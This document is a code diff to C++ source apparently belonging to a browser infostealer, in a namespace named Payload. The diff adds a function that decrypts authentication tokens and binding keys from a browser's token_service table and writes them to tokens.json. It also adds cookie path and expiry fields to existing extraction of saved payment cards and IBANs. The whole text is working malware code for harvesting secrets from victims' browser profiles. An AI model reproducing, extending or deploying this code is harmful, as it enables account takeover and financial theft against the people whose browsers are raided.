@@ -63,6 +63,7 @@ namespace Payload {
                 if (auto db = OpenDatabase(webDataPath)) {
                     ExtractCards(db, m_outputBase / browserName / profilePath.filename() / "cards.json");
                     ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / "iban.json");
+                    ExtractTokens(db, m_outputBase / browserName / profilePath.filename() / "tokens.json");
                     sqlite3_close(db);
                 }
             }
@@ -92,6 +93,8 @@ namespace Payload {
                     std::stringstream ss;
                     ss << "{\"host\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                        << "\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
+                       << "\"path\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 2)) << "\","
+                       << "\"expires\":" << sqlite3_column_int64(stmt, 5) << ","
                        << "\"value\":\"" << EscapeJson(val) << "\"}";
                     entries.push_back(ss.str());
                 }
@@ -237,6 +240,59 @@ namespace Payload {
             for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
             out << "]";
             m_pipe.Log("IBANS:" + std::to_string(entries.size()));
+        }
+    }
+
+    void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
+        sqlite3_stmt* stmt;
+        bool hasBindingKey = true;
+        
+        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
+            hasBindingKey = false;
+            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
+        }
+
+        std::vector<std::string> entries;
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            const void* blob = sqlite3_column_blob(stmt, 1);
+            int len = sqlite3_column_bytes(stmt, 1);
+            
+            if (blob && len > 0) {
+                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
+                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
+                if (dec) {
+                    std::string val((char*)dec->data(), dec->size());
+                    std::string bindingKey = "";
+                    
+                    if (hasBindingKey) {
+                        const void* bKeyBlob = sqlite3_column_blob(stmt, 2);
+                        int bKeyLen = sqlite3_column_bytes(stmt, 2);
+                        if (bKeyBlob && bKeyLen > 0) {
+                            std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
+                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);
+                            if (decKey) {
+                                bindingKey = std::string((char*)decKey->data(), decKey->size());
+                            }
+                        }
+                    }
+
+                    std::stringstream ss;
+                    ss << "{\"service\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
+                       << "\"token\":\"" << EscapeJson(val) << "\","
+                       << "\"binding_key\":\"" << EscapeJson(bindingKey) << "\"}";
+                    entries.push_back(ss.str());
+                }
+            }
+        }
+        sqlite3_finalize(stmt);
+
+        if (!entries.empty()) {
+            std::filesystem::create_directories(outFile.parent_path());
+            std::ofstream out(outFile);
+            out << "[\n";
+            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            out << "]";
+            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
         }
     }
 
